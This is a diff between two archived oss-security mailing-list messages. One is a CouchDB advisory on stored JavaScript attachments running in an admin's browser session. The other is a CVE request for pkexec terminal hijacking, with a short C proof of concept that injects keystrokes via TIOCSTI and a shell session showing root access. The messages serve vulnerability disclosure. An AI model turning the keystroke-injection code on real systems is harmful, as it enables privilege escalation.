@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["1002" "Tuesday" "12" "October" "2021" "10:56:13" "+0200" "Jan Lehnardt" "jan@apache.org" nil "27" "[oss-security] CVE-2021-38295 Apache CouchDB <= 3.1.1 privilege escalation " nil nil nil "10" nil nil (number mark "U       jan@apache.o Oct 12   27/1002  " thread-indent "\"[oss-security] CVE-2021-38295 Apache CouchDB <= 3.1.1 privilege escalation \"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-38295 Apache CouchDB <= 3.1.1 privilege escalation " nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["1183" "Thursday" "25" "February" "2016" "12:15:11" "+0100" "up201407890@alunos.dcc.fc.up.pt" "up201407890@alunos.dcc.fc.up.pt" "<20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>" "47" "[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl" nil nil nil "2" "2016022511:15:11" "[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl" (number mark "U       up201407890@ Feb 25   47/1183  " thread-indent "\"[oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 24489 invoked by uid 550); 12 Oct 2021 11:03:29 -0000
+Received: (qmail 7263 invoked by uid 550); 25 Feb 2016 14:11:23 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,42 +12,67 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 9627 invoked from network); 12 Oct 2021 08:56:27 -0000
-From: Jan Lehnardt <jan@apache.org>
-Content-Type: text/plain;
-	charset=us-ascii
-Content-Transfer-Encoding: 7bit
-Mime-Version: 1.0 (Mac OS X Mail 12.4 \(3445.104.21\))
-Message-Id: <A2600194-3759-4165-A437-9BCAE3F97429@apache.org>
-Date: Tue, 12 Oct 2021 10:56:13 +0200
+Received: (qmail 16035 invoked from network); 25 Feb 2016 11:16:30 -0000
+Message-ID: <20160225121511.17881tlkjezvzolc@webmail.alunos.dcc.fc.up.pt>
+Date: Thu, 25 Feb 2016 12:15:11 +0100
+From: up201407890@alunos.dcc.fc.up.pt
 To: oss-security@lists.openwall.com
-X-Mailer: Apple Mail (2.3445.104.21)
-Subject: [oss-security] CVE-2021-38295 Apache CouchDB <= 3.1.1 privilege escalation 
+Cc: cve-assign@mitre.org
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset=ISO-8859-1;
+	DelSp="Yes";
+	format="flowed"
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
+User-Agent: Internet Messaging Program (IMP) H3 (4.2)
+X-Virus-Scanned: amavisd-new at alunos.dcc.fc.up.pt
+Subject: [oss-security] CVE Request: pkexec tty hijacking via TIOCSTI ioctl
 
-Description
-===========
+Bug report to redhat:
+https://bugzilla.redhat.com/show_bug.cgi?id=3D1300746
 
-A malicious user with permission to create documents in a
-database is able to attach a HTML attachment to a document.
-If a CouchDB admin opens that attachment in a browser, e.g.
-via the CouchDB admin interface Fauxton, any JavaScript code
-embedded in that HTML attachment will be executed within the
-security context of that admin. A similar route is available
-with thealready deprecated `_show` and `_list` functionality.
 
-This *privilege escalation* vulnerability allows an attacker
-to add or remove data in any database or make configuration
-changes.
+When executing a program via "pkexec --user nonpriv program" the=20=20
+nonpriv session can
+escape to the parent session by using the TIOCSTI ioctl to push=20=20
+characters into the
+terminal's input buffer, allowing privilege escalation.
+This issue has been fixed in "su" by calling setsid() and in "sudo" by=20=20
+using the
+"use_pty" flag.
 
-Mitigation
-==========
+# cat test.c
+#include <sys/ioctl.h>
 
-CouchDB 3.2.0  and onwards adds `Content-Security-Policy`
-headers for all attachment, `_show` and `_list` requests.
-This breaks certain niche use-cases and there are
-configuration options to restore the previous behaviour for
-those who need it.
+int main()
+{
+  char *cmd =3D "id\n";
+  while(*cmd)
+   ioctl(0, TIOCSTI, cmd++);
+}
 
-CouchDB 3.1.2 defaults to the previous behaviour, but adds
-configuration options to turn `Content-Security-Policy` headers
-on for all affected requests.
+# gcc test.c -o test
+# id saken
+uid=3D1000(saken) gid=3D1000(saken) groups=3D1000(saken)
+
+# pkexec --user saken ./test ----> last command i type in
+id
+# id ----> did not type this
+uid=3D0(root) gid=3D0(root) groups=3D0(root)
+
+
+This is similar to CVE-2005-4890 and CVE-2013-6409
+
+I'd like to request a CVE for this issue.
+
+PS: I don't believe any of the previous mentions of fixes for "su" and
+"sudo" would work here, since executing a shell via pkexec would make it not
+have job control.
+
+Thanks,
+Federico Bento
+
+----------------------------------------------------------------
+This message was sent using IMP, the Internet Messaging Program.
+
